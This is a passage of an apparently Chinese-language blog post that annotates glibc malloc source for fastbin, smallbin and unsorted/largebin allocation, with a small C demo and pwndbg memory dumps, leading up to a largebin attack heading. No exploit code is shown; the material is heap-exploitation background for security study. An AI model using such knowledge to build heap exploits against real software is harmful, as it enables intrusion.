!= victim);</span></span><br><span class="line"><span class="comment">// 检查请求的内存大小是否小于等于最大快速分配大小</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 计算请求大小对应的fastbin索引</span></span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx); <span class="comment">// 获取相应的fastbin指针</span></span><br><span class="line">    mchunkptr pp; <span class="comment">// 定义一个指针，用于操作快速分配器中的块</span></span><br><span class="line">    victim = *fb; <span class="comment">// 从fastbin中获取一个空闲chunk</span></span><br><span class="line">    <span class="comment">// 检查是否有可用的内存块</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在单线程环境下，直接更新快速分配器指针</span></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = victim-&gt;fd; <span class="comment">// 将 fb 指向下一个空闲块</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            REMOVE_FB (fb, pp, victim); <span class="comment">// 在多线程环境下安全地移除该块</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确保 victim 不为 NULL 以继续处理</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取 victim 的大小对应的索引</span></span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">            <span class="comment">// 检查 victim 的索引是否与请求的索引一致</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">                <span class="comment">// 如果不一致，报告内存损坏错误</span></span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            <span class="comment">// 执行对 victim 块的进一步检查，确保其可以安全使用</span></span><br><span class="line">            check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)<span class="comment">//单线程</span></span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;<span class="comment">//多线程操作</span></span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//将victim放入tcache中</span></span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_list[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        chunk_list[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(chunk_list[i]);</span><br><span class="line">	<span class="built_in">free</span>(chunk_list[<span class="number">9</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[<span class="number">7</span>]);<span class="comment">//这个进入了smallbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_list[7]进入了smallbin&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//观察源代码的执行</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//这个就是从smallbin中取出来放进tcache的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果请求的内存较小，检查常规的内存池（small bins）。</span></span><br><span class="line"><span class="comment">  由于这些“smallbin”每个只包含一个大小，因此不需要在内存池内搜索。</span></span><br><span class="line"><span class="comment">  （对于较大的请求，我们需要等待unsortedbin被处理，以找到最佳匹配。</span></span><br><span class="line"><span class="comment">   但对于smallbin chunk请求，适配是准确的，因此我们现在可以检查，这样更快。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))  <span class="comment">// 检查请求的大小是否在smallbin范围内</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);  <span class="comment">// 计算请求大小对应的smallbin索引</span></span><br><span class="line">    bin = bin_at(av, idx);  <span class="comment">// 获取对应的smallbin指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)  <span class="comment">// 获取smllbin中的最后一个块，如果不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;  <span class="comment">// 记录被分配chunk的后继chunk</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))  <span class="comment">// 检查双向链表的完整性</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"></span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);  <span class="comment">// 设置块状态为已使用</span></span><br><span class="line">        bin-&gt;bk = bck;  <span class="comment">// 更新小块指针</span></span><br><span class="line">        bck-&gt;fd = bin;  <span class="comment">// 维护双向链表的完整性</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)  <span class="comment">// 检查是否在主分配区</span></span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        </span><br><span class="line">        check_malloced_chunk(av, victim, nb);  <span class="comment">// 检查分配的块</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* 在这里，如果我们看到相同大小的其他块，</span></span><br><span class="line"><span class="comment">           将它们存入线程缓存（tcache）。 */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);  <span class="comment">// 计算tcache索引</span></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  <span class="comment">// 检查tcache是否有效</span></span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 当小块不为空且线程缓存未满时，复制块。 */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                &amp;&amp; (tc_victim = last(bin)) != bin)  <span class="comment">// 获取小块列表中的最后一个块</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)  <span class="comment">// 检查块是否有效</span></span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;  <span class="comment">// 获取块的后继块</span></span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);  <span class="comment">// 设置状态为已使用</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);  <span class="comment">// 更新非主分配区标志</span></span><br><span class="line"></span><br><span class="line">                    bin-&gt;bk = bck;  <span class="comment">// 更新小块指针</span></span><br><span class="line">                    bck-&gt;fd = bin;  <span class="comment">// 维护双向链表的完整性</span></span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);  <span class="comment">// 将victim放入tcache中</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);  </span><br><span class="line">        alloc_perturb(p, bytes);  </span><br><span class="line">        <span class="keyword">return</span> p;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h3><p>首先处理unsortedbin中的空闲chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果这是一个大请求，在继续之前合并快速块（fastbins）。</span></span><br><span class="line"><span class="comment">  虽然在查看是否有可用空间之前处理所有快速块看起来有些过度，</span></span><br><span class="line"><span class="comment">  但这样可以避免通常与快速块相关的碎片问题。</span></span><br><span class="line"><span class="comment">  此外，实际上，程序倾向于连续产生小请求或大请求，</span></span><br><span class="line"><span class="comment">  而不常出现混合请求，因此在大多数程序中，</span></span><br><span class="line"><span class="comment">  不会频繁调用合并操作。而在那些频繁调用合并操作的程序</span></span><br><span class="line"><span class="comment">  中，往往会导致内存碎片。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index(nb);  <span class="comment">// 计算请求大小对应的大块索引</span></span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))  <span class="comment">// 检查fastbin中是否存在空闲chunk</span></span><br><span class="line">        malloc_consolidate(av);  <span class="comment">// 合并fastbin的空闲chunk</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  处理最近释放或剩余的内存块，仅在块完全匹配时才取用，</span></span><br><span class="line"><span class="comment">  或者如果这是一个小请求，则取用从最近的非完全匹配中剩余的块。</span></span><br><span class="line"><span class="comment">  将其他遍历到的块放入合适的池中。</span></span><br><span class="line"><span class="comment">  请注意，这个步骤是在任何例程中唯一将块放入池中的地方。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  这里的外部循环是必要的，因为我们可能直到 malloc 接近结束时</span></span><br><span class="line"><span class="comment">  才意识到我们应该合并，因此必须执行合并并重试。</span></span><br><span class="line"><span class="comment">  这最多发生一次，并且只在我们需要扩展内存以满足“小”请求时。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;  <span class="comment">// 用于缓存的块大小</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx(nb);  <span class="comment">// 将请求大小转换为tcache索引</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  <span class="comment">// 检查缓存是否启用并且索引有效</span></span><br><span class="line">    tcache_nb = nb;  <span class="comment">// 设置缓存块大小</span></span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;  <span class="comment">// 标记返回缓存块的状态</span></span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>项目</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>unsorted_chunks(av)</code></td>
<td>获取 unsorted bin 的链表头（伪 chunk），位于 <code>main_arena</code> 固定偏移处</td>
</tr>
<tr>
<td>循环条件</td>
<td>遍历 unsorted bin 中的真实 chunk，<strong>逆序处理</strong>直到链表头</td>
</tr>
<tr>
<td>链表头特性</td>
<td><code>fd</code> 指向第一个真实 chunk，<code>bk</code> 指向最后一个真实 chunk</td>
</tr>
</tbody></table>
<p>首先要搞明白一个宏<code>unsorted_chunks(av)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsorted_chunks(av) = bin_at(av, <span class="number">1</span>)</span><br><span class="line">                    = (<span class="type">char</span>*)&amp;av-&gt;bins[(<span class="number">1</span><span class="number">-1</span>)*<span class="number">2</span>] - offsetof(malloc_chunk, fd)</span><br><span class="line">                    = (<span class="type">char</span>*)&amp;av-&gt;bins[<span class="number">0</span>] - <span class="number">0x10</span>  <span class="comment">// 因 malloc_chunk.fd 偏移为 0x10</span></span><br><span class="line">                    = main_arena + <span class="number">0x58</span> - <span class="number">0x10</span>    </span><br><span class="line">                    = main_arena + <span class="number">0x48</span>           <span class="comment">//这个是main_arena+88的head</span></span><br></pre></td></tr></table></figure>

<p>下面的源代码实现从 last remainder chunk，large bins 和top chunk 中分配所需的 chunk， 这里包含了多个多层循环，在这些循环中，主要工作是分配前两步都未分配成功的 small bin chunk，large bin chunk 和 large chunk。最外层的循环用于重新尝试分配 small bin chunk，因 为如果在前一步分配small bin chunk 不成功，并没有调用 malloc_consolidate()函数合并 fast bins 中的 chunk，将空闲 chunk 加入 unsorted bin 中，如果第一尝试从 last remainder chunk， top chunk 中分配 small bin chunk 都失败以后，如果 fast bins 中存在空闲 chunk，会调用 malloc_consolidate()函数，那么在 usorted bin 中就可能存在合适的 small bin chunk 供分配， 所以需要再次尝试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;<span class="comment">//记录循环的次数</span></span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;<span class="comment">//逆序</span></span><br><span class="line">        bck = victim-&gt;bk; <span class="comment">//bck需要注意</span></span><br><span class="line">        size = chunksize (victim);</span><br><span class="line">        mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">            || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">             如果是小内存请求，且unsorted bin中仅存最后一个剩余块（last_remainder），</span></span><br><span class="line"><span class="comment">             则尝试使用它。这有助于提升连续小内存请求的局部性。</span></span><br><span class="line"><span class="comment">             这是最佳适配策略的唯一例外，且仅适用于小内存块没有精确匹配的情况。</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<span class="comment">//判断是否需要分配一个small bin chunk</span></span><br><span class="line">            bck == unsorted_chunks (av) &amp;&amp;<span class="comment">//unsortedbin中只有一个chunk</span></span><br><span class="line">            victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//并且这个chunk为last_remainder chunk</span></span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))<span class="comment">//且大于所需chunk的size加上MINSIZE</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">            remainder_size = size - nb;<span class="comment">//计算切分后剩下的chunk大小</span></span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<span class="comment">//链入unsortedbin中</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;<span class="comment">//如果属于largebin chunk将该chunk的fd_nextsize和bk_nextsize设置为NULL</span></span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">	  <span class="comment">//设置分配出的chunk和last_remainder chunk的相关信息</span></span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;<span class="comment">//返回应用层，退出</span></span><br></pre></td></tr></table></figure>

<p>原unsortedbin_attack（向任意地址即bck的fd写入main_arena+88），因加了这个检查后就用不了了</p>
<p>若前面仍未完成分配，则将usnortedbin中最后一个chunk拿出来若与所需大小一致，将当前chunk返回，否则分类并归位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>启用tcache，将chunk先放入tcache中，再返回给给用户，当tcache满的时候才直接返回给用户</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>开始归为前面遍历到但不符合需求的chunk。</p>
<p>如果当前 chunk 属于small bins，获得当前 chunk 所属small bin 的 index，并将该 small bin 的链表表头赋值给 bck，第一个 chunk 赋值给 fwd，也就是当前的 chunk 会插入到 bck 和 fwd 之间，作为small bin 链表的第一个 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果当前 chunk 属于 large bins，获得当前 chunk 所属 large bin 的 index，并将该 large bin 的链表表头赋值给 bck，第一个 chunk 赋值给 fwd，也就是当前的 chunk 会插入到 bck 和 fwd 之间，作为 large bin 链表的第一个 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd</span><br></pre></td></tr></table></figure>

<p>如果fwd 不等于 bck，意味着<strong>large bin 中有空闲chunk 存在</strong>，由于large bin 中的空闲chunk 是按照大小顺序排序的，需要将当前从 unsorted bin 中取出的 chunk 插入到 large bin 中合适 的位置。将当前 chunk 的 size 的 inuse 标志 bit 置位，相当于加 1，便于加快 chunk 大小的比 较，找到合适的地方插入当前 chunk。这里还做了一次检查，断言在 large bin 双向循环链表 中的最后一个 chunk的 size 字段中的非主分配区的标志 bit没有置位，因为所有在 large bin 中的 chunk 都处于空闲状态，该标志位一定是清零的。</p>
<hr>
<p>根据内存结构理解largebin的fd和bk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x1f2ae850 —▸ 0x1f2ae420 —▸ 0x1f2ae000 —▸ 0x7f5cf0f79f68 (main_arena+1096) ◂— 0x1f2ae850</span><br><span class="line">pwndbg&gt; x/10gx 0x1f2ae850 <span class="comment">#最大 </span></span><br><span class="line">0x1f2ae850:     0x0000000000000000      0x0000000000000421</span><br><span class="line">0x1f2ae860:     0x000000001f2ae420      0x00007f5cf0f79f68#bk-&gt;main_arena+1096</span><br><span class="line">0x1f2ae870:     0x000000001f2ae420      0x000000001f2ae000</span><br><span class="line">0x1f2ae880:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1f2ae890:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1f2ae420 <span class="comment"># fd_nextsize-&gt;小的 bk_nextsize-&gt;大的</span></span><br><span class="line">0x1f2ae420:     0x0000000000000000      0x0000000000000411</span><br><span class="line">0x1f2ae430:     0x000000001f2ae000      0x000000001f2ae850</span><br><span class="line">0x1f2ae440:     0x000000001f2ae000      0x000000001f2ae850</span><br><span class="line">0x1f2ae450:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1f2ae460:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1f2ae000 <span class="comment"># 最小</span></span><br><span class="line">0x1f2ae000:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1f2ae010:     0x00007f5cf0f79f68      0x000000001f2ae420#fd-&gt;main_arena+1096</span><br><span class="line">0x1f2ae020:     0x000000001f2ae850      0x000000001f2ae420</span><br><span class="line">0x1f2ae030:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1f2ae040:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7f5cf0f79f68 <span class="comment">#头节点  fd-&gt;最大  bk-&gt;最小</span></span><br><span class="line">0x7f5cf0f79f68 &lt;main_arena+1096&gt;:       0x00007f5cf0f79f58      0x00007f5cf0f79f58</span><br><span class="line">0x7f5cf0f79f78 &lt;main_arena+1112&gt;:       0x000000001f2ae850&lt;-fwd 0x000000001f2ae000&lt;-bck</span><br><span class="line">0x7f5cf0f79f88 &lt;main_arena+1128&gt;:       0x00007f5cf0f79f78      0x00007f5cf0f79f78</span><br><span class="line">0x7f5cf0f79f98 &lt;main_arena+1144&gt;:       0x00007f5cf0f79f88      0x00007f5cf0f79f88</span><br><span class="line">0x7f5cf0f79fa8 &lt;main_arena+1160&gt;:       0x00007f5cf0f79f98      0x00007f5cf0f79f98</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x1fa8f000 —▸ 0x1fa8f840 —▸ 0x1fa8f420 —▸ 0x7f9a8e388f68 (main_arena+1096) ◂— 0x1fa8f000</span><br><span class="line">pwndbg&gt; x/10gx 0x1fa8f000</span><br><span class="line">0x1fa8f000:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1fa8f010:     0x000000001fa8f840      0x00007f9a8e388f68</span><br><span class="line">0x1fa8f020:     0x000000001fa8f000      0x000000001fa8f000</span><br><span class="line">0x1fa8f030:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f040:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1fa8f840</span><br><span class="line">0x1fa8f840:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1fa8f850:     0x000000001fa8f420      0x000000001fa8f000</span><br><span class="line">0x1fa8f860:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f870:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f880:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x1fa8f420</span><br><span class="line">0x1fa8f420:     0x0000000000000000      0x0000000000000401</span><br><span class="line">0x1fa8f430:     0x00007f9a8e388f68      0x000000001fa8f840</span><br><span class="line">0x1fa8f440:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f450:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x1fa8f460:     0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7f9a8e388f68</span><br><span class="line">0x7f9a8e388f68 &lt;main_arena+1096&gt;:       0x00007f9a8e388f58      0x00007f9a8e388f58</span><br><span class="line">0x7f9a8e388f78 &lt;main_arena+1112&gt;:       0x000000001fa8f000      0x000000001fa8f420</span><br><span class="line">0x7f9a8e388f88 &lt;main_arena+1128&gt;:       0x00007f9a8e388f78      0x00007f9a8e388f78</span><br><span class="line">0x7f9a8e388f98 &lt;main_arena+1144&gt;:       0x00007f9a8e388f88      0x00007f9a8e388f88</span><br><span class="line">0x7f9a8e388fa8 &lt;main_arena+1160&gt;:       0x00007f9a8e388f98      0x00007f9a8e388f98</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>largebin_attack</strong></p>
<p>从上面的内存结构可以看出fwd-&gt;最小的；bck-&gt;最大的</p>
